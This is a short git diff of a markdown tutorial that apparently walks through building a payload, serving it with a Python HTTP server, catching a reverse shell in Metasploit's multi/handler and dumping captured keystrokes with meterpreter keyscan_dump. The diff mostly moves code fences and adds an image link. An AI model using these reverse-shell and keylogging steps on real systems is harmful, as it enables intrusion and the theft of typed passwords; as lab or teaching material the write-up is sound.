@@ -47,11 +47,12 @@ Saved as: shell.exe
 ```LPORT``` = local port <br>
 ```-f``` = file format <br>
 ```-o``` = output file name
-```
 
+```
 python -m http.server 8000
-
 ```
+![alt](images/keylog(1).PNG)
+
 ```
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -73,3 +74,4 @@ To retrieve captured keystrokes, the command meterpreter > keyscan_dump is used.
 ```
 meterpreter > keyscan_dump
 ```
+
